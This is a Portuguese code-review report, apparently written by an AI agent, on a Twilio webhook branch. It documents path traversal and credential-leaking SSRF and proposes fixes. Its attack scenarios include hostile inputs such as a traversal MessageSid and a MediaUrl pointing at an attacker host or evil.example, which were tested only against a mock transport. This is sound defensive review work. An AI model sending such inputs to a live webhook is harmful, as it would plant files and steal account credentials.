# Revisão de código: branch `janela/2026-09-25` (diff `develop..HEAD`)

- **Data:** 2026-09-25
- **Skill:** `revisao-codigo` (primeira passada, antes da análise do Beto). Diretrizes D01 a D04 consideradas.
- **Alvo:** 5 commits (`035d2e7` download de mídia, `fa0ae7b` docs do plano, `8a7939a` ProfileName, `b23c4cb` webhook MessageType/idempotência/fixtures, `59b21a4` anonimização de telefone). 35 arquivos, +1604/-81.
- **Papel:** apontar achados. Não aprova nem declara pronto para merge, isso é decisão do Beto.

## O que foi executado

- `ruff check` nos arquivos alterados: passa.
- `pytest tests/test_captura_midia.py tests/test_nome_perfil.py`: 25 passaram (os dois não tocam o banco).
- **Não rodei** `test_webhook_payloads_reais.py` nem `test_processador_nome_perfil.py`: os dois escrevem no banco real, e o segundo troca o `MODO_EXECUCAO` global (ver A4). Outro agente está usando o backend na 8001 contra o mesmo banco.
- Prova de conceito dos achados A1/A2 feita só na pasta de scratchpad da sessão, com `httpx.MockTransport` (nenhuma requisição de rede real).
- Conferi o `.env` só nas chaves de flag (sem ler segredos): hoje está `CANAL_SAIDA=twilio` e `TWILIO_CAPTURAR_PAYLOADS=true`, com `TWILIO_VALIDAR_ASSINATURA` no default (`false`). **Isso deixa A1 a A3 ativos agora**, se o túnel estiver no ar. Não verifiquei se o túnel está no ar.

---

## Achados com confiança >= 70

### A1. Path traversal: `MessageSid` do formulário vira nome de arquivo (Alta, confiança 95)

- **Onde:** `backend/services/canal/captura_midia.py:76` e `:105`
- **Problema:** `message_sid = formulario.get("MessageSid") or "sem_sid"` entra direto em `pasta / f"{message_sid}_{i}{ext}"`. A extensão também vem de fora (`MediaContentType{i}`, via `mimetypes`).
- **Cenário:** `POST /webhook` com `MessageSid=../../services/x`, `NumMedia=1`, `MediaContentType0=text/x-python`, `MediaUrl0=https://host-do-atacante/p`. O arquivo `x_0.py`, com o conteúdo que o atacante servir, é gravado fora de `logs/midias_twilio/`, em qualquer pasta onde o processo escreve. Reproduzido: com `MessageSid=../fora_da_pasta` o arquivo `fora_da_pasta_0.py` saiu da pasta de destino.
- **Correção sugerida:** aceitar só SID no formato da Twilio (`^(SM|MM)[0-9a-f]{32}$`, senão `sem_sid_<uuid>`) e, por garantia, conferir `destino.resolve().is_relative_to(pasta.resolve())` antes de gravar. Opcionalmente restringir a extensão à tabela `_EXTENSOES_FIXAS` mais uma lista curta, com `.bin` no resto.

### A2. Credenciais da Twilio enviadas para qualquer host em `MediaUrl{i}` (SSRF) (Alta, confiança 95)

- **Onde:** `backend/services/canal/captura_midia.py:79-97`
- **Problema:** o `AsyncClient` é criado com `auth=_credenciais()` (API Key SID + Secret, ou Account SID + Auth Token) e faz `GET` na URL que veio do formulário, sem conferir o host. Também não há limite de tamanho (`resposta.content` carrega tudo em memória) nem de quantidade (`NumMedia` sem teto).
- **Cenário:** `MediaUrl0=https://host-do-atacante/x`: o atacante recebe `Authorization: Basic base64(SK...:segredo)` e passa a ter acesso à conta Twilio (reproduzido com credencial falsa: o header chegou ao host `evil.example`). Com `MediaUrl0=http://192.168.0.34:5433/` ou outro endereço da rede local, o backend vira proxy de varredura interna. Com `NumMedia=100000`, 100 mil linhas de erro no `indice.jsonl`; com uma URL que serve 2 GB, o processo estoura memória.
- **Correção sugerida:** só baixar quando a URL for `https://api.twilio.com/...` (conferir esquema e host com `httpx.URL`); passar `auth` por requisição, não no cliente, e só nesse caso; `NumMedia` limitado a 10 (máximo da Twilio); download por `client.stream` com teto de bytes (ex.: 20 MB) e erro no índice se passar. O redirecionamento da Twilio para o armazenamento de mídia continua funcionando, porque o httpx 0.26 já descarta `Authorization` em redirect para outra origem.

### A3. O download é disparado antes da validação de assinatura (Alta, confiança 90)

- **Onde:** `backend/main.py:195` (dentro de `_capturar_payload_twilio`) e `backend/main.py:660-661` (ordem `_capturar_payload_twilio` → `_exigir_assinatura_twilio`)
- **Problema:** mesmo com `TWILIO_VALIDAR_ASSINATURA=true`, uma requisição sem assinatura já agendou o download (A1/A2) antes de receber o 403. A captura crua do formulário antes da assinatura é anterior a esta branch e pode ser proposital (guardar também o que falhou na assinatura); o que é novo é pendurar nela um efeito com rede e disco.
- **Cenário:** qualquer um que conheça a URL pública do túnel manda o formulário forjado; o 403 vem depois, e o download já está em andamento.
- **Correção sugerida:** tirar `agendar_download_midias(formulario)` de `_capturar_payload_twilio` e chamá-lo em `webhook_twilio` depois de `_exigir_assinatura_twilio` (e, de quebra, depois da checagem de idempotência, para uma reentrega não baixar de novo). Mesmo assim A1 e A2 precisam ser corrigidos, porque a validação fica desligada por default.

### A4. Teste troca o `MODO_EXECUCAO` global no banco compartilhado (Média, confiança 75)

- **Onde:** `backend/tests/test_processador_nome_perfil.py:25-32`
- **Problema:** a fixture grava `EXECUCAO_NORMAL` na tabela `parametros` do banco real durante o teste e só restaura no teardown. O padrão veio de `test_processador_modo_execucao.py` (pré-existente), mas esta branch acrescenta mais um arquivo com ele.
- **Cenário:** exatamente o de hoje: backend na 8001 contra o mesmo banco, `.env` com `CANAL_SAIDA=twilio`. Uma mensagem real que chegue enquanto o pytest roda é auto-aprovada e entregue ao cliente pelo backend, sem aprovação humana. Se o pytest for morto (`kill -9`, queda da sessão) antes do teardown, o sistema fica em `EXECUCAO_NORMAL` até alguém notar.
- **Correção sugerida:** no teste, `monkeypatch.setattr(ParametroService, "modo_execucao", lambda self: ModoExecucao.EXECUCAO_NORMAL)` em vez de gravar no banco. Vale revisar o `test_processador_modo_execucao.py` no mesmo passo (fora do diff, decisão do Beto se entra nesta janela).

### A5. "O nome veio do perfil" é deduzido por igualdade de texto, sem registro de origem (Média, confiança 70)

- **Onde:** `backend/services/conversacao/regras_globais.py:141` e `:171-172`
- **Problema:** as duas regras tratam `contato.nome == ctx.nome_perfil` (o `ProfileName` **desta** mensagem) como prova de que o nome veio do perfil. Não há coluna que diga a origem do nome.
- **Cenários:**
  1. O cliente troca o nome do perfil no WhatsApp. O nome antigo, gravado a partir do perfil, deixa de ser reconhecido: passa a valer como nome dado pelo cliente, não é mais substituído pelo nome que ele digitar, e no fluxo de data de nascimento vai para `Pessoa.nome` (linha 141), contrariando a docstring de `_processar_cpf_fornecido` ("nunca vai para `Pessoa.nome`").
  2. O contrário: o operador (ou o próprio cliente) gravou um nome igual ao do perfil. Qualquer entidade `nomes` que o classificador extraia de uma mensagem posterior sobrescreve esse nome (linha 172). Antes desta branch, um contato com nome nunca era sobrescrito.
- **Correção sugerida:** guardar a origem do nome (ex.: `Contato.nome_origem` = `perfil_whatsapp` / `cliente` / `operador`, via migração Alembic) e decidir por ela. Alternativa sem schema: guardar o `ProfileName` usado em `AtendimentoInfo`/campo livre e comparar com ele, e não com o da mensagem atual. **Exige decisão do Beto** (muda o modelo de dados).

---

## Achados com confiança < 70 (baixa confiança)

- **B1.** `backend/main.py:669` com `backend/main.py:446` (idempotência x timeout). Em `EXECUCAO_NORMAL` modo `twiml`, a resposta sai no TwiML da primeira chamada e a mensagem é marcada como entregue (`marcar_entregue_por_twiml`). Se a Twilio abandonar essa chamada por timeout (15 s) e reentregar (só acontece com reentrega configurada, `#rc=`), a segunda recebe TwiML vazio: o cliente fica sem resposta e o banco diz que entregou. Antes também se perdia, mas com erro no log; agora é silencioso. Possível correção: na reentrega, se já existe resposta gerada para aquele SID ainda sem `message_sid` de saída, devolvê-la no TwiML. Decisão do Beto. Confiança 50.
- **B2.** `backend/services/canal/captura_midia.py:122-127`. Tarefa cancelada no shutdown ou no `--reload` levanta `CancelledError` (não é `Exception`): o anexo se perde sem linha no `indice.jsonl`, contrariando "toda falha é registrada no índice". Gravação de arquivo e índice é síncrona dentro do event loop (aceitável para instrumentação). Confiança 50.
- **B3.** `backend/main.py:505-510`. Localização descarta campos que a Twilio manda para lugar nomeado (`Address`, `Label`) e uma `Latitude` sem `Longitude` vira "sem coordenadas" perdendo o valor. Documento com legenda não foi colhido: não sei se a legenda vem no `Body` no lugar do nome do arquivo (se vier, o texto do cliente deixa de ir ao cérebro). Vale colher um exemplo de cada antes da conta trial acabar. Confiança 40.
- **B4.** `backend/utils/nome_perfil.py:833-838`. Caracteres invisíveis e de controle bidirecional (U+200B, U+202E) passam e são gravados (`"​Ana"` e `"Ana‮"` voltam aproveitáveis); o U+202E pode inverter a renderização da saudação no painel. `"A B C"` e `"Loja"` passam (já declarado como regra provisória). Correção: remover categoria Unicode `Cf` antes de validar. Mexe na regra provisória, então decisão do Beto. Confiança 45.
- **B5.** `backend/main.py:469-512` (D02, design-oo). `_conteudo_sem_texto` decide comportamento por `MessageType` com `if tipo == ...`, e o conjunto tende a crescer (contacts, sticker, áudio transcrito, localização com endereço). Passada D04: não existe hoje mecanismo de tipo de mensagem para reusar; o dono natural seria algo em `services/canal/` (tabela ou Strategy por tipo). Com dois casos só, não é urgente; fica o registro. Confiança 50.
- **B6.** `backend/services/canal/captura_midia.py:67-70`. Reimplementa a leitura de `NumMedia` que já existe em `main.py::_quantidade_de_midias` (que ainda faz `strip` e limita a zero). Mover o helper para `services/canal/` e usar nos dois lugares. Confiança 50.
- **B7.** Testes. `test_captura_midia.py` não cobre SID malicioso ou ausente, host fora da Twilio, nem `agendar_download`; os testes de webhook nunca exercitam captura + download (o `conftest` desliga a captura). O teste de idempotência de texto (`test_message_sid_ja_gravado_nao_aciona_o_cerebro`) insere a `Mensagem` à mão porque o dublê do cérebro não persiste: prova a checagem, não que o caminho real grava o SID (grava, `processador.py:267-281`, mas nenhum teste amarra os dois). Os testes de `_conteudo_sem_texto` e de nome de perfil testam comportamento real, não o dublê. Confiança 40.
- **B8.** Dados pessoais fora das fixtures. `backend/services/debug_log.py:8-15,99,104` (fora do diff) usa `19991931176`, a um dígito do número real trocado no `59b21a4`; pode ser real também. O histórico do git continua com o número real (o próprio commit registra isso). `processador.py:329` grava o `ProfileName` cru no log de debug, coerente com o que o arquivo já faz com o texto da mensagem e o telefone (pasta `logs/` ignorada pelo git). Confirmar com o Beto se `19991931176` é real. Confiança 40.

---

## Separação por quem decide

### O orquestrador pode corrigir sem decisão do Beto

- **A1** validar `MessageSid` e conferir que o destino fica dentro da pasta.
- **A2** allowlist `https://api.twilio.com`, auth só nesse caso, teto de `NumMedia` e de bytes.
- **A3** mover o `agendar_download_midias` para depois da assinatura (e da idempotência).
- **A4** trocar a escrita em `parametros` por `monkeypatch` no `test_processador_nome_perfil.py`.
- **B2** capturar `asyncio.CancelledError` em `_rodar`, registrar no índice e relançar.
- **B6** reusar `_quantidade_de_midias`.
- **B7** testes de regressão para A1 a A3 (SID com `../`, host estranho, requisição sem assinatura não agenda download).

### Exige decisão do Beto

- **Operacional, agora:** desligar `TWILIO_CAPTURAR_PAYLOADS` (ou tirar o túnel do ar) até A1 a A3 entrarem, versus manter a colheita com a conta trial perto de expirar.
- **A5** registrar a origem do nome (migração Alembic) ou aceitar a heurística por igualdade.
- **A4 (extensão)** corrigir também o `test_processador_modo_execucao.py`, fora do diff.
- **B1** reenviar a resposta já gerada numa reentrega.
- **B3** colher documento com legenda e localização com endereço antes de a conta trial expirar.
- **B4** endurecer a regra provisória do nome de perfil.
- **B5** criar o dono do comportamento por `MessageType` agora ou quando surgir o terceiro caso.
- **B8** confirmar se `19991931176` é número real.

---

## Descartado ou verificado sem achado

- **Fixtures `backend/tests/fixtures/twilio/`:** anonimização completa nos campos conferidos: `From`, `To`, `WaId`, `ChannelToAddress` (mascarado), `ProfileName`, `ChannelMetadata`, `ExternalUserId`, todos os SIDs (inclusive dentro das `MediaUrl` e do `OriginalRepliedMessageSid`), `AccountSid`, coordenadas (Praça da Sé, ponto público), nome do PDF (UUID) e texto longo (neutro). Sobram `recebido_em` reais e `mensagem_id=3754` (id interno), sem risco. Detalhe: `texto_simples.json` tem `recebido_em` de 24/09, e o README fala em colheita de 25/09.
- **Credenciais em log:** nem o índice nem os logs gravam `Authorization`; as exceções do httpx não incluem a senha. O risco de credencial é o de A2 (envio para terceiros), não o de log.
- **`MessageType` ausente, `NumMedia` lixo, `MessageSid` vazio:** tratados (`_conteudo_sem_texto` cai na regra antiga, `_quantidade_de_midias` devolve 0, `_mensagem_ja_recebida` e `mensagem_existe` devolvem `False` para vazio). Chamadas do testador e do simulador não mandam `MessageSid` (conferido em `testador_conversas/` e `frontend/src/`), então nunca são barradas.
- **Reentrega:** o SID de entrada é gravado e comitado no passo 1 de `processar()` (`processador.py:267-281`) e no caminho sem texto, então uma reentrega posterior é barrada. Duas entregas simultâneas do mesmo SID passariam as duas pela checagem: descartado pelo **D01** (concorrência no mesmo atendimento, a ser resolvida pelo semáforo planejado).
- **ProfileName com espaços e Unicode:** espaços (inclusive NBSP) aparados e colapsados, NFC aplicado, acentos contam como letra; testes cobrem inclusive NFD. Só o caso de caracteres invisíveis ficou (B4).
- **Criação de contato:** todos os caminhos que criam contato recebem o nome de perfil como último recurso (`processador.py:1271,1320,1343,1394`); nenhum leva o nome de perfil para `Pessoa.nome` no primeiro passo do CPF.
- **Regras do CLAUDE.md:** acesso a dados por SQLAlchemy (`db.mensagem_existe`), nenhuma mudança de schema, ordem de rotas inalterada, `from models import ...`, comentários e docs em português. Nenhum caminho novo de entrega por fora de `entregar_mensagem`.
- **Tarefas asyncio:** referência forte mantida em `_tarefas`; escritas no índice são síncronas num único thread, sem intercalar linhas. Nome `sem_sid` fixo faria duas mensagens sem SID sobrescreverem uma à outra, mas só chamada local ou forjada vem sem SID (resolvido junto com A1).
- **Estilo e lint:** `ruff` passa; nada a acrescentar.
